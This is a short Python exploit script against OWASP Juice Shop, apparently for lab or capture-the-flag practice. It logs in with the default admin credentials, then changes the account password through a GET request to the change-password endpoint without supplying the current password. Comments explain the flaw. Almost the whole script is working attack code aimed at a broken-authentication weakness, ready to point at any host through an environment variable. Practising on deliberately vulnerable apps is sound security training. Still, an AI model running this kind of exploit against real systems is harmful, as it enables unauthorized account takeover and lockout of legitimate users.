import os
import requests

BASE = os.environ.get("JS_TARGET", "http://192.168.100.51:3000").rstrip("/")

email = os.environ.get("JS_EMAIL", "admin@juice-sh.op")
password = os.environ.get("JS_PASSWORD", "admin123")
new_password = os.environ.get("JS_NEWPASS", "NewPass123!")

# Step 1: Authenticate to get a token. The vulnerability is that the
# change-password endpoint does not require the CURRENT password, but you
# still need a valid session token to call it.
login = requests.post(
    f"{BASE}/rest/user/login",
    json={"email": email, "password": password},
    timeout=5,
)

try:
    token = login.json().get("authentication", {}).get("token")
except requests.exceptions.JSONDecodeError:
    print("Login did not return JSON:", login.status_code, login.text)
    raise SystemExit(1)

if not token:
    print("Login failed, no token returned:", login.status_code, login.text)
    raise SystemExit(1)

headers = {"Authorization": f"Bearer {token}"}

# Step 2: Change the password WITHOUT supplying the current one.
# Juice Shop exposes this as a GET with query params: new + repeat, no current.
params = {"new": new_password, "repeat": new_password}
r = requests.get(
    f"{BASE}/rest/user/change-password",
    headers=headers,
    params=params,
    timeout=5,
)

print("Status:", r.status_code)
print("Body:", r.text)
